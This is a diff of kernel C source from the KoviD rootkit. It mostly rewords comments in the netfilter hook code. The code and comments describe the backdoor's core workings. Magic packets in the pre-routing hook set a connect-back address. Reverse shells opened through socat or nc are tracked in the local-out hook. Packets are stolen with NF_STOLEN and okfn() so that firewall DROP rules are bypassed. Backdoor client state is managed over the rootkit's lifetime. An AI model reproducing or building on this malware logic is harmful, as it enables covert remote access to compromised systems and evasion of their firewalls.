@@ -306,26 +306,24 @@ bool kv_bd_established(__be32 *daddr, int dport, bool established) {
     struct iph_node_t *node, *node_safe;
 
     list_for_each_entry_safe_reverse(node, node_safe, &iph_node, list) {
-        /**
-         * Storing saddr is done at the moment the magic packets are
-         * received by pre-routing netfilter hook.
-         * The client sends a packet with special flags set and source address
-         * is the hint that says: connect to this address and port.
+        /*
+         * We store 'saddr' when we receive magic packets in the pre-routing
+         * netfilter hook. These packets have special flags and a source address
+         * that serves as a hint to connect to a specific address and port.
          *
-         * That will trigger a local application, socat, nc, etc that will
-         * attempt to connect to that particular address:port. When that happens
-         * we'll hook those packets in our local out netfilter hook and check
-         * the matching here. Packets coming to local out filter will be destined
-         * to the same address:port set in pre-routing, but this time they are
-         * daddr:dport, hence the swapped check you see here.
+         * A local application like 'socat' or 'nc' will attempt to connect to
+         * the hinted address:port. Our local out netfilter hook will intercept
+         * these packets, and we check for matches here.
+         *
+         * Incoming packets to the local out filter are bound for the same
+         * address:port set in pre-routing, but this time, they have
+         * daddr:dport, leading to the swapped check you see here.
          */
         if (node->iph->saddr == *daddr && htons(node->tcph->source) ==  dport) {
-            /**
-             * Make sure to mark established only once per-connection so
-             * they will not loose state.
-             * This will make internal references to be kept until
-             * connections are closed by clients, when tasks are revealed, data
-             * freed and reverse shell(s) killed.
+            /*
+             * Mark connections as "established" only once per connection to retain state.
+             * This ensures that internal references persist until other end close connections.
+             * Upon revealing tasks, data is freed, and reverse shells are terminated.
              */
             node->established = established;
 
@@ -489,23 +487,11 @@ static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
     return rc;
 }
 
-/**
- * Let's suppose the target has a local netfiler rule similar to the following:
+/*
+ * This section deals with hijacking netfilter rules to establish reverse shells. It allows us
+ * to send packets to the wire by bypassing the firewall. An important aspect is managing
+ * internal backdoors: states, data lifecycle, synchronization, and more. The high-level process:
  *
- *  target     prot opt source               destination
- *  DROP       tcp  --  anywhere             <    IP    >         tcp dpt:<port>
- *
- *  Q: How are we supposed to establish a reverse shell to IP:port?
- *  A: By hijacking the netfilter stack: stealing the packet and calling okfn()
- *
- *  NF_STOLEN packets will not continue their route through the chain, hence technically
- *  they will not be blocked but would go nowhere either, unless okfn() is used: to
- *  send the packet out to the wire.
- *
- *  Part of the implementation is dedicated to internal backdoors management: keeping states,
- *  data lifetime, synchronization and more.
- *
- *  Here is a high-level diagram:
  *  .---------------..--------------.      .---------.      .------------.         .-----------..------------------.
  *  |Hacker bdclient||kv pre-routing|      |kv filter|      |revshell app|         |kv inet-out||kv bypass firewall|
  *  '---------------''--------------'      '---------'      '------------'         '-----------''------------------'
@@ -539,16 +525,12 @@ static unsigned int _sock_hook_nf_fw_bypass(void *priv, struct sk_buff *skb,
         case IPPROTO_TCP: {
                 struct tcphdr *tcph = (struct tcphdr *)skb_transport_header(skb);
                 int dstport = htons(tcph->dest);
-                /**
-                 * include/net/tcp_states.h
-                 * sk_state carries current connection state of the packet, at this point in time.
-                 * What I look for here are for TCP_ESTABLISHED packets that will tell me that, well,
-                 * the connection has been completed, therefore that indicates that I can keep the
-                 * state and addresses for this connection.
-                 *
-                 * The established state will only be recorded the first time it comes here and
-                 * are kept throughout backdoor's lifetime.
-                 * */
+                /*
+                 * The `sk_state` in include/net/tcp_states.h represents the current connection state of a packet.
+                 * When a packet is in the TCP_ESTABLISHED state, it signifies that the connection has completed.
+                 * This information is crucial for retaining the state and addresses of this connection, which is
+                 * stored throughout the lifetime of the backdoor.
+                 */
                 if (kv_bd_established(&iph->daddr,
                             dstport, (skb->sk->sk_state == TCP_ESTABLISHED))) {
                     /**
@@ -651,12 +633,11 @@ void kv_sock_stop_fw_bypass(void) {
         nf_unregister_net_hook(&init_net, &ops_fw);
     }
 
-    /**
-     * Established connections are kept in
-     * iph_node until one of them terminates, or
-     * KoviD is unloaded. Key here is to always make
-     * sure if one BD client exits, all remaining ones
-     * are terminated too.
+    /*
+     * Established connections are maintained in `iph_node` until
+     * one of them terminates or until KoviD is unloaded.
+     * It's essential to ensure that if one backdoor (BD) client exits,
+     * all remaining ones are terminated as well.
      */
     _bd_cleanup(true);
 }
